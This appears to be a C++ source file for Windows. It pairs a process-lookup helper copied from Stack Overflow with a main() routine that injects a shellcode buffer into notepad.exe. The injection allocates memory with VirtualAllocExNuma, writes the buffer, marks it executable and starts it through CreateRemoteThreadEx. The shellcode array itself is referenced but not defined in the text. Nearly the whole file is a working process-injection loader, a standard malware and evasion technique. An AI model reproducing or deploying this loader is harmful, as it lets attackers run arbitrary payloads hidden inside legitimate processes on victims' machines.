// https://stackoverflow.com/a/55030118
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    DWORD pid = 0;


    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        pid = processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            pid = processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return pid;
}

int main()
{
	SIZE_T scSize = sizeof(shellcode);

    // change process
	auto procPid = FindProcessId(L"notepad.exe");

    if (!procPid) return 0;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, procPid);

    if (!hProcess) return 0;

    PVOID vAlloc = VirtualAllocExNuma(hProcess, 0, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);

    if (vAlloc == NULL) {
        return 0;
    }
    else
    {
        printf("Address of allocated memory: 0x%p\n", vAlloc);
    } // printf("VirtualAllocExNuma Success\n");

    bool wProcessMem = WriteProcessMemory(hProcess, vAlloc, shellcode, scSize, nullptr);
    if (wProcessMem == false) {
        return 0;
    } // printf("WriteProcessMemory Success\n");

    DWORD oldProtect = NULL;
    if (!VirtualProtectEx(hProcess, vAlloc, scSize, PAGE_EXECUTE_READ, &oldProtect)) {
        return 0;
    } // printf("VirtualProtectEx Success\n");

    HANDLE cThread = CreateRemoteThreadEx(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)vAlloc, NULL, 0, NULL, NULL);
    if (!cThread) {
        return 0;
    } // printf("CreateRemoteThreadEx Success\n")
}